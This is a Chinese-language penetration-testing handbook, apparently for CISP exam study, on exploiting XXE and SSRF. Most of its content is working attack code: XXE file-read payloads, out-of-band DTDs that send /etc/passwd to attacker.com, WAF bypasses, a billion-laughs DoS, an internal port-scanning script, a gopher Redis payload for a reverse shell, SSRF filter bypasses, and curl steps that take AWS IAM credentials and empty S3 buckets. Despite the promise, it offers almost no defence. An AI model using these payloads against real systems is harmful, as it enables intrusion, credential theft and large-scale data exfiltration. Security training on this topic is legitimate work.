# XXE 与 SSRF 深度利用手册

> **📘 文档定位**：CISP 考试 渗透测试 高级 | 难度：⭐⭐⭐⭐ | 预计阅读：30 分钟
>
> 深入讲解 XXE（XML 外部实体注入）与 SSRF（服务端请求伪造）的攻击原理、利用链构造及防御方案，覆盖 OOB 外带数据、端口探测、云元数据攻击等高级技巧。

---

## 导航目录

- [一、XXE 漏洞原理](#一xxe-漏洞原理)
- [二、XXE 利用技巧](#二xxe-利用技巧)
- [三、SSRF 漏洞原理](#三ssrf-漏洞原理)
- [四、SSRF 利用技巧](#四ssrf-利用技巧)
- [五、XXE+SSRF 组合利用](#五xxessrf-组合利用)
- [六、安全部署 Checklist](#六安全部署-checklist)
- [七、高分考点与知识巧记](#七高分考点与知识巧记)

---

## 📋 目录

1. [XXE 漏洞原理](#一xxe-漏洞原理)
2. [XXE 利用全系列](#二xxe-利用)
3. [XXE 绕过技巧](#三xxe-绕过技巧)
4. [SSRF 漏洞原理](#四ssrf-漏洞原理)
5. [SSRF 内网探测](#五ssrf-内网探测)
6. [SSRF 协议利用](#六ssrf-协议利用)
7. [SSRF 绕过技巧](#七ssrf-绕过技巧)
8. [云环境攻击](#八云环境)
9. [完整案例](#九完整案例)

---

## 一、XXE 漏洞原理

### 1.1 什么是 XXE

```
XXE (XML External Entity) = XML 外部实体注入

原理：XML解析器处理了攻击者可控的外部实体声明
      → 读取本地文件 / SSRF / DoS

前提：后端使用支持DTD的XML解析器，且未禁用外部实体
```

### 1.2 漏洞代码

```php
// ❌ PHP — libxml_disable_entity_loader 之前默认开启
$xml = $_POST['xml'];
$doc = new DOMDocument();
$doc->loadXML($xml, LIBXML_NOENT);  // NOENT = 替换实体 → 危险!
echo $doc->textContent;

// ❌ Java — XMLInputFactory 默认
XMLInputFactory factory = XMLInputFactory.newInstance();
XMLStreamReader reader = factory.createXMLStreamReader(new StringReader(xml));

// ❌ Python — lxml 默认开启
from lxml import etree
tree = etree.fromstring(xml)  # 默认解析实体
```

### 1.3 基础探测 Payload

```xml
<!-- 1. 基础实体注入 -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe "XXE Test">
]>
<root>&xxe;</root>

<!-- 2. 文件读取 -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- 3. 内网探测 -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://10.0.1.100:8080/">
]>
<root>&xxe;</root>

<!-- 4. DoS (十亿笑攻击) -->
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  ... → 指数增长 → 内存爆炸
]>
<root>&lol9;</root>
```

---

## 二、XXE 利用

### 2.1 文件读取

```xml
<!-- Linux -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- Windows -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root>&xxe;</root>

<!-- PHP文件 → 用 php://filter 绕过 -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">
]>
<root>&xxe;</root>
<!-- → 返回base64编码的PHP源码(避免被执行) -->

<!-- 读取目录 -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///var/www/">
]>
```

### 2.2 SSRF 内网探测

```xml
<!-- 探测内网端口 -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://10.0.1.100:8080/">
]>
<root>&xxe;</root>

<!-- 带外数据(OOB) — 将读取的文件外传 -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root>xxe</root>

<!-- evil.dtd 内容(攻击者服务器) -->
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
%all;
<!-- → /etc/passwd的内容通过HTTP请求发送到攻击者服务器 -->
```

### 2.3 完整 OOB 文件窃取

```xml
<!-- 请求(受害服务器发送) -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/oob.dtd">
  %dtd;
]>
<root>test</root>

<!-- oob.dtd (攻击者服务器) -->
<!ENTITY % payload "<!ENTITY &#37; send SYSTEM 'http://attacker.com/?d=%xxe;'>">
%payload;
%send;

<!-- 攻击者日志 -->
# 收到: GET /?d=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFza...
# base64解码 → /etc/passwd内容!
```

---

## 三、XXE 绕过

```xml
<!-- 1. UTF-16 编码绕过 -->
<!-- 将Payload编码为UTF-16 → 绕过WAF关键字检测 -->

<!-- 2. 参数实体绕过 -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % a "fi">
  <!ENTITY % b "le:///etc/passwd">
  <!ENTITY xxe SYSTEM "%a;%b;">
]>
<root>&xxe;</root>

<!-- 3. 编码绕过 -->
<!-- file:// → &#102;&#105;&#108;&#101;&#58;&#47;&#47; -->

<!-- 4. CDATA 绕过(输出不包含特殊字符时) -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % start "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % end "]]>">
  <!ENTITY % dtd SYSTEM "http://attacker.com/cdata.dtd">
  %dtd;
]>
<root>&all;</root>
```

---

## 四、SSRF 漏洞原理

### 4.1 什么是 SSRF

```
SSRF (Server-Side Request Forgery) = 服务端请求伪造

原理：服务器根据用户提供的URL发起请求
      → 攻击者让服务器请求内网资源

危害：
  ① 内网探测 — 扫描内网端口和服务
  ② 内网攻击 — 对内网系统发起攻击
  ③ 云元数据窃取 — 读取云实例的IAM凭据
  ④ 文件读取 — file:// 协议读取本地文件
```

### 4.2 漏洞代码

```php
// ❌ 直接使用用户输入的URL
$url = $_GET['url'];
$content = file_get_contents($url);

// ❌ curl 无过滤
$url = $_GET['url'];
$ch = curl_init($url);
curl_exec($ch);

// 攻击:
// ?url=http://169.254.169.254/latest/meta-data/  (AWS元数据)
// ?url=http://10.0.1.1/admin                         (内网攻击)
// ?url=file:///etc/passwd                              (文件读取)
// ?url=gopher://127.0.0.1:6379/_INFO                  (Redis攻击)
```

---

## 五、SSRF 内网探测

### 5.1 端口扫描脚本

```python
#!/usr/bin/env python3
"""SSRF 内网端口扫描"""
import requests

TARGET = "https://xxx.com/proxy?url="
INTERNAL_IPS = [f"10.0.1.{i}" for i in range(1, 255)]
INTERNAL_IPS += [f"10.0.2.{i}" for i in range(1, 255)]
INTERNAL_PORTS = [22, 80, 443, 8080, 3306, 6379, 27017, 9200]

for ip in INTERNAL_IPS:
    for port in INTERNAL_PORTS:
        url = f"http://{ip}:{port}/"
        try:
            resp = requests.get(TARGET + url, timeout=3)
            if resp.status_code != 504:  # 非超时 → 端口开放
                print(f"[+] {ip}:{port} OPEN (status={resp.status_code}, len={len(resp.text)})")
        except:
            pass
```

### 5.2 常见内网资产

```
常见内网目标：
  10.0.1.5:88     — 域控 Kerberos
  10.0.1.5:389    — 域控 LDAP
  10.0.1.10:3306  — MySQL
  10.0.1.20:6379  — Redis（未授权？）
  10.0.1.30:9200  — Elasticsearch
  10.0.1.50:8080  — Jenkins
  10.0.1.60:9090  — Prometheus
  127.0.0.1:22    — 本机SSH
```

---

## 六、SSRF 协议利用

### 6.1 gopher:// 协议

```
gopher = 原始TCP协议隧道 — 攻击任意TCP服务

Redis 攻击（未授权访问）:
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a...crontab_payload...%0d%0a
→ 向Redis写入crontab → 反弹shell

MySQL 攻击:
gopher://127.0.0.1:3306/_<MySQL认证包>

编码规则:
  %0d%0a = CRLF (Redis命令分隔符)
  _ = gopher协议分隔符
```

### 6.2 dict:// 协议

```
dict 协议 — 字典服务，可探测端口
dict://127.0.0.1:6379/info → 返回 Redis 信息
dict://127.0.0.1:22/info    → SSH banner
```

---

## 七、SSRF 绕过

```
1. IP 格式绕过
   127.0.0.1 → http://127.1 (省略)
   127.0.0.1 → http://0x7f.0x0.0x0.0x1 (十六进制)
   127.0.0.1 → http://2130706433 (十进制)
   127.0.0.1 → http://0177.0.0.1 (八进制)
   localhost → http://127.0.0.1 (hosts解析)
   域名DNS指向127.0.0.1 (如 nip.io: http://127.0.0.1.nip.io)

2. URL 格式绕过
   http://example.com@127.0.0.1 (URL认证)
   http://127.0.0.1#example.com (Fragment)
   http://127.0.0.1?example.com (Query)

3. 302 跳转绕过
   攻击者服务器 302 → http://169.254.169.254/
   (某些SSRF过滤只在第一次URL生效)

4. DNS Rebinding
   ① 用户访问 http://attacker.com → DNS解析到公共IP → 通过SSRF过滤
   ② 攻击者修改DNS → 解析到 127.0.0.1
   ③ 服务器再次向 http://attacker.com 发起请求 → 访问127.0.0.1!
```

---

## 八、云环境

### 8.1 云元数据端点

```
AWS:
  http://169.254.169.254/latest/meta-data/
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
  # → 获取 IAM Role 临时凭证(AK/SK/Token)

阿里云:
  http://100.100.100.200/latest/meta-data/
  http://100.100.100.200/latest/meta-data/ram/security-credentials/

腾讯云:
  http://metadata.tencentyun.com/latest/meta-data/

Google Cloud:
  http://metadata.google.internal/computeMetadata/v1/
  (需要 Header: Metadata-Flavor: Google)

Azure:
  http://169.254.169.254/metadata/instance?api-version=2021-02-01
  (需要 Header: Metadata: true)
```

### 8.2 AWS 凭证获取

```bash
# 通过 SSRF 获取 AWS 临时凭证
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 返回:
# s3-readonly-role

curl http://169.254.169.254/latest/meta-data/iam/security-credentials/s3-readonly-role

# 返回:
# {
#   "AccessKeyId": "AKIAXXXXX",
#   "SecretAccessKey": "xxxxx",
#   "Token": "xxxxx",
#   "Expiration": "2026-06-13T00:00:00Z"
# }

# 配置AWS CLI:
aws configure set aws_access_key_id AKIAXXXXX
aws configure set aws_secret_access_key xxxxx
aws configure set aws_session_token xxxxx

# 验证:
aws sts get-caller-identity
aws s3 ls  # 列出所有S3桶!
```

---

## 九、完整案例

```
案例1: XXE → 内网代码泄露
  目标: 某企业员工信息管理系统，支持XML导入

  Step 1: 正常上传XML → 成功解析
  Step 2: XXE测试 → 返回/etc/passwd → 确认漏洞
  Step 3: php://filter读取应用源码
    → 发现数据库密码 → 连接内网MySQL
    → MySQL有FILE权限 → 读取SSH私钥
    → SSH登录其他服务器 → 完全控制

案例2: SSRF → AWS S3数据泄露
  目标: 某SaaS平台，头像支持URL导入

  Step 1: 头像URL功能 → ?url=https://attacker.com/test.png → 成功
  Step 2: ?url=http://169.254.169.254/ → 403 (黑名单?/WAF?)
  Step 3: 绕过: ?url=http://169.254.169.254.xip.io/ → 返回metadata!
  Step 4: 获取IAM Role凭证 → aws s3 ls → 
    发现3个S3桶(含用户上传文件桶)
  Step 5: aws s3 cp s3://user-uploads-bucket/ . --recursive
    → 导出全部用户上传文件(含身份证/合同等敏感文件)
```

---

## ✅ Checklist

**XXE 测试**
- [ ] 基础实体注入测试
- [ ] 文件读取 (file:///)
- [ ] OOB 带外数据外传
- [ ] DoS 测试
- [ ] php://filter 绕过
- [ ] CDATA/编码绕过

**SSRF 测试**
- [ ] 内网扫描(常见端口)
- [ ] gopher协议攻击(Redis/MySQL)
- [ ] file:// 读取本地文件
- [ ] 云元数据端点探测
- [ ] IP格式/302跳转/DNS Rebinding绕过
